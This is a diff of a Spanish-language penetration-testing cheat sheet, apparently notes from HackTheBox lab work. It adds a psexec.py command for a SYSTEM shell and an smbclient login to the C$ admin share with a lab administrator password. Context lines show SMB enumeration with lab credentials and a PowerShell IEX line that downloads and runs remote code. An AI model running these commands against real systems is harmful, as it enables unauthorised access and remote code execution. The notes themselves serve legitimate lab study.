@@ -608,6 +608,14 @@ Ahora para que los grupos puedan leer y escribir
 chmod g+rw archivo
 ```
 
+## psexec.py 
+
+Esta herrameinta sirve si tienes un usuario en el grupo Administrators y regresa una shell con permisos de Authority System
+
+```
+psexec.py active.htb/administrator@10.10.10.10
+```
+
 ## Dirty Cow
 
  Esta vulnerablidad esta en kernels viejos. Esta entre el rango 2.6.22 < 3.9
@@ -1841,7 +1849,7 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 
 ## Listar SMB shares NULL session
 
-```
+```bash
 
 smbmap -H 10.129.2.148 -u 'loquesea'
 
@@ -1858,12 +1866,14 @@ crackmapexec smb 10.129.2.148 --shares -u '' -p ''
 
 ## Listar SMB Shares con credenciales
 
-```
+```bash
 smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
 
 enum4linux -a -u "SVC_TGS" -p "GPPstillStandingStrong2k18" 10.129.2.148 # Puedes ver con este usuario que shares tiene acceso
 
 smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+
+smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
 
 ```
 
